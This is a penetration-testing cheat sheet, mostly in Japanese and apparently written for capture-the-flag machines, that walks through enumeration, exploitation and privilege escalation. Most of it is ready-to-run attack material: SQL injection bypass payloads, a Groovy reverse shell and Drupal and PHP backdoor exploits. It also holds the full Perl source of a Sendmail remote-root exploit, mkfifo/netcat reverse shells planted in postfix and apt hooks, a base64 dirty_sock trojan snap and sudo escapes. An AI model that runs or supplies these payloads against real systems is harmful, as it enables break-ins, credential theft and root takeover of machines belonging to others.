# Enumeration

## Nmap

### TCP port scan

開いているポートを素早く取得する．

```bash
ports=$(nmap -p- --min-rate=1000 -T4 {target_IP} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

開いているポートに対して詳細な情報を取得する．

```bash
nmap -p$ports -sV -A {target_IP}
```

### UDP port scan

scan the well-known ports.

```bash
sudo nmap -Pn -sU -p --min-rate=10000 {target_IP}
```

## gobuster

### Directory busting

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u {target_IP}
```

## pspy64

https://github.com/DominicBreuker/pspy

### Get http response headers

```bash
curl -I http://{target_IP}/index.php
```

### Process snooping

```bash
./pspy64
```

# TCP

 ## FTP - 21TCP

### Anonymous login without password

```bash
ftp {target_ip} {target_port}
```

Log in with the username `anonymous`.

## SSH - 22TCP

### Brute-force attack

```bash
hydra -L {username.txt} -P {/usr/share/wordlists/metasploit/unix_pass_words.txt} ssh://{target_IP} -V -f -t 60
```

| options | description                                    | example       |
| ------- | ---------------------------------------------- | ------------- |
| -l      | login name                                     | root          |
| -L      | login name list                                | username.txt  |
| -p      | password                                       | toor          |
| -P      | password list                                  | rockyou.txt   |
| -V      | verbose mode                                   | flag          |
| -f      | exit after the first found login/password pair | flag          |
| -t      | run tasks number of connects in parallel       | (default: 16) |

## HTTP - 80TCP

### Most common passwords: latest 2021 statistics

https://cybernews.com/best-password-managers/most-common-passwords/

1. 123456
2. 123456789
3. qwerty
4. password
5. 12345
6. qwerty123
7. 1q2w3e
8. 12345678
9. 111111
10. 1234567890

### SQL Injection

https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt

```sql
or 1=1
or 1=1--
or 1=1#
or 1=1/*
or 1=1 -- -
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1-- -
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```http
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

### ShellShock

gobuster で `/cgi-bin/` を見つける。

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}/
/cgi-bin/             (Status: 403) [Size: 294]
```

`-x`オプションに `cgi`, `sh`, `pl`, `py` を入れて再度列挙。

```ba
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}/cgi-bin/ -x cgi, sh, pl, py
```

`user.sh`などのファイルを見つける。

nmap の `http-shellshock` スクリプトを使用する。

```ba
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls {target_IP}
```

### Jenkins

Script Consoleにアクセスする。

```
http://{target_IP}/script
```

Script Console に [Groovy payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) を貼り付けて reverse shell を取得。

```Groovy
String host="{your_IP}";
int port={port e.g. 1234};
String cmd="{/bin/bash or cmd.exe}";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()) {
	while(pi.available()>0)so.write(pi.read());
	while(pe.available()>0)so.write(pe.read());
	while(si.available()>0)po.write(si.read());
	so.flush();
	po.flush();
	Thread.sleep(50);
	try {
		p.exitValue();
		break;
	} catch(Exception e) {}
};
p.destroy();
s.close();	
```

### Drupal 7

https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py

```bash
python3 drupa7-CVE-2018-7600.py http://{target_IP}/ -c "{shell command}"
```

`/var/www/html/sites/default/settings.php` に Drupal で使われているデータベースのユーザ名とパスワードが保存されている可能性がある．

```bash
python3 drupa7-CVE-2018-7600.py http://{target_IP}/ -c "cat /var/www/html/sites/default/settings.php | grep -n -ie username -ie password"
```

### XXE - XEE - XML External Entity

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

XMLの入力フィールドにXXEインジェクションコードを入れて送信する。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

BurpSuite の Repeater を使って出力を確認する。

```bash
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### PHP 8.1.0-dev

https://www.exploit-db.com/exploits/49933

User-Agentt にリバースシェルを書き込む．

```bash
curl http://{target_IP}/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i&>/dev/tcp/{your_IP}/{port} 0>&1 '\");"
```

## SMB - 445TCP

### Administrator login without password

```bash
smbclient -L {target_IP} -U Administrator
```

### smbmap

共有ディスクを再帰的に探す．

```bash
smbmap -H {target_IP} -R
```

### rpcclient

ドメインユーザの列挙．

```bash
rpcclient -U "" -N {target_IP}
rpcclient $> enumdomusers
user:[{user}] rid:[0x3e8]
rpcclient $> queryuser {user}
```

## RDP - 3389TCP

### Testing guest login

```bash
xfreerdp /v:{target_IP}
```

### Administrator login without password

```
xfreerdp /v:{traget_IP} /cert:ignore /u:Administrator
Password:{Enter(without password)}
```

# UDP

## TFTP - 69UDP

任意のファイルをアップロードできる。

```bash
tftp {target_IP}
tftp> put {filename}
tftp> quit
```

アップロードしたファイルのデフォルト保存場所は `/var/lib/tftpboot/{filename}`。

## SNMP - 161UDP

### Enumerate

SNMP で管理されている機器を列挙する．

```bash
snmp-check {target_IP}
```

### Sendmail with clamav-milter < 0.91.2 - RCE

https://www.exploit-db.com/exploits/4761

`clamav-milter` が `black-hole-mode` で起動していたら下記のスクリプトを実行する．

```perl black-hole.pl
#!/usr/bin/perl

use IO::Socket;

print "Sendmail w/ clamav-milter Remote Root Exploit\n";
print "Copyright (C) 2007 Eliteboy\n";

if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;}

print "Attacking $ARGV[0]...\n";

$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                              PeerPort => '25',
                              Proto    => 'tcp');

print $sock "ehlo you\r\n";
print $sock "mail from: <>\r\n";
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
print $sock "data\r\n.\r\nquit\r\n";

while (<$sock>) {
        print;
}
```

正常に実行が終わったら `netcat` でシェルを手に入れる．

```bash
nc -nv {target_IP} 31337
```

# Lateral Movement

## msfvenom

https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md

リバースシェルを含んだ `.apk` ファイルを作成し，`msfvenom` のテンプレートとして作成したファイルを使う．

`msfconsole` を利用した方法を示す．

```bash
msfconsole
msf6 > search msfvenom
msf6 > use 0
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST {your_IP}
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT {your_port}
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/kali/.msf4/local/msf.apk
```

出来上がった `msf.apk` ファイルを `msfvenom` の Android テンプレートとして使用する．

## www-data user

`/var/www/html`を確認する。

```bash
ls -a
.htaccess	.htpasswd
cat .htpasswd
username:password
```

`.htpasswd` に `username` , `password` が平文で保存されており、それが shell で使いまわされている可能性がある。

# Privilege Escalation

## Linux

### SUID binaries

誰が実行しても設定したユーザで実行されるファイルを探す．

```bash
find / -perm -u=s -type f 2>/dev/null
```

例えば `/usr/bin/base32` が設定されていた場合は，所有者が `root` かどうか調べる．

```bash
$ ls -la /usr/bin/base32
-rwsr-sr-x 1 root root 43712 Feb 28  2019 /usr/bin/base32
```

所有者が `root` のため，このコマンドは誰が実行しても `root` として実行される．

`/usr/bin/base32` が権限昇格に使えるかどうかは [GTFOBins](https://gtfobins.github.io/) で調べられる．

```bash
LFILE=/root/.ssh/i
/usr/bin/base32 "$LFILE" | /usr/bin/base32 --decode
```

### lxd or lxc group

https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

ローカルマシンで distro builder をインストール・ビルドして、出来上がった `lxd.tar.xz`, `rootfs.squashfs` をターゲットマシンに転送する。

### filter group

https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze

`/etc/postfix/disclaimer_addresses` に含まれているユーザがメールを送信すると `/etc/postfix/disclaimer` が実行されるため，`/etc/postfix/disclaimer` にリバースシェルコードを追記し，メールを送信する．

```bash /etc/postfix/disclaimer
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f  # add this line
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

...
```

```python sendemail.py
import smtplib

hostname = "127.0.0.1"
sender_email = "kyle@writer.htb"
port = 25
receiver_email = "john@writer.htb"
message = "Hi! John I need reverse shell"

# Try to log in to server and send email
try:
    server = smtplib.SMTP(hostname, port)
    server.ehlo()
    server.sendmail(sender_email, receiver_email, message)
except Exception as e:
    print(e)
finally:
    server.quit()
```

### management group

https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

apt-get が cron job として実行されている場合は，`/etc/apt/apt.conf.d/` 配下にリバースシェルコードを書いたファイルを作成し，cron job の実行を待つ．

```bash /etc/apt/apt.conf.d/shell
'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f"};'
```

### sudo msfconsole command

`msfconsole` コマンドを `sudo` で実行し，`irb` コマンドで Ruby shell を起動する．

```bash
sudo msfconsole
msf6 > irb
>> system("/bin/bash")
```

### sudo knife command

`knife data bag` サブコマンドを `sudo` で実行する．

```bash
sudo knife data bag create {bagname} {item} -e vi

...

:!/bin/sh
```

`knife exec` コマンドを `sudo` で実行する．

```bash
sudo knife exec --exec "exec '/bin/sh -i' "
```

### sudo snap command

https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py

```bash
python3 dirty_sockv2.py
```

動かない場合は手動で `snap` ファイルを作成し，インストールする．

```python
$ python3
Python 3.6.8 (default, Nov 16 2020, 16:55:22)
[GCC 4.8.5 20150623 (Red Hat 4.8.5-44)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> TROJAN_SNAP = ('''
... aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
... /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
... ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
... TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
... T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
... Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
... ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
... ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
... L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
... b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
... rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
... rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
... AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
... XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
... RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
... AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
...                + 'A' * 4256 + '==')
>>> import base64
>>> blob = base64.b64decode(TROJAN_SNAP)
>>> f = open("scr.snap", "wb")
>>> f.write(blob)
4096
>>> f.close()
>>>
$ sudo snap install --devmode ./scr.snap
dirty-sock 0.1 installed
```

## Windows

### nc64.exe (Netcat)

https://eternallybored.org/misc/netcat/

https://github.com/int0x33/nc.exe/blob/master/nc64.exe

ローカルマシンで `netcat` を実行しておく。

```bash
nc -lvnp {port}
```

ターゲットマシンに `nc64.exe` を導入し、実行する。

```powershell
nc64.exe -e cmd.exe {your_IP} {port}
```

